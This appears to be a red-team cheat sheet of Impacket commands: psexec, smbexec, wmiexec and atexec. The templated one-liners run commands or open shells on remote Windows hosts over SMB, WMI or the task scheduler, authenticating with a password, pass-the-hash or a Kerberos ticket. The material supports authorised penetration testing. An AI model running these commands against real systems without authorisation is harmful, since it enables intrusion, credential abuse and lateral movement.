# impacket

% impacket, windows, exec

## PSEXEC with username
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
psexec.py <domain>/<user>:<password>@<ip>
```

## PSEXEC with pass the Hash (pth)
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
psexec.py -hashes <hash> <user>@<ip>
```

## PSEXEC with kerberos
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
export KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
```

## SMBEXEC with username
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
smbexec.py <domain>/<user>:<password>@<ip>
```

## SMBEXEC with pass the Hash (pth)
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
smbexec.py -hashes <hash> <user>@<ip>
```

## SMBEXEC with kerberos
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
export KRB5CCNAME=<ccache_file>; smbexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
```

## wmiexec
#platform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
Execute a command shell without touching the disk or running a new service using DCOM

```
wmiexec.py <domain>/<user>:<password>@<ip>
```

## wmiexec  with pass the hash (pth) 
#platform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  

Execute a command shell without touching the disk or running a new service using DCOM

```
wmiexec.py -hashes <hash> <user>@<ip>
```

## atexec - execute command view the task scheduler 
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Using \pipe\atsvc via SMB

```
atexec.py <domain>/<user>:<password>@<ip> "command"
```

## atexec pass the hash (pth)
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Execute command view the task scheduler (using \pipe\atsvc via SMB)

```
atexec.py -hashes <hash> <user>@<ip> "command"
```
